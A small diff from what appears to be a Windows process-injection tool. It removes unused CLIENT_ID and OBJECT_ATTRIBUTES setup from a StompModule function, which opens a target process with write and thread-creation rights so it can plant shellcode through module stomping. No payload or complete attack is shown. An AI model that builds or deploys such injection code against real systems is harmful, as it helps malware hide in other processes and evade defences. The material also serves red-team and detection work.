@@ -262,11 +262,6 @@ BOOL StompModule(DWORD pid, const wchar_t* dllPath,
     if (!shellcode || shellcodeSize == 0) return FALSE;
 
     // 1. Open target
-    CLIENT_ID cid = {};
-    cid.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<ULONG_PTR>(pid));
-    OBJECT_ATTRIBUTES oa = {};
-    InitializeObjectAttributes(&oa, nullptr, 0, nullptr, nullptr);
-
     HANDLE hProc = OpenTarget(pid,
         PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_VM_READ |
         PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD);
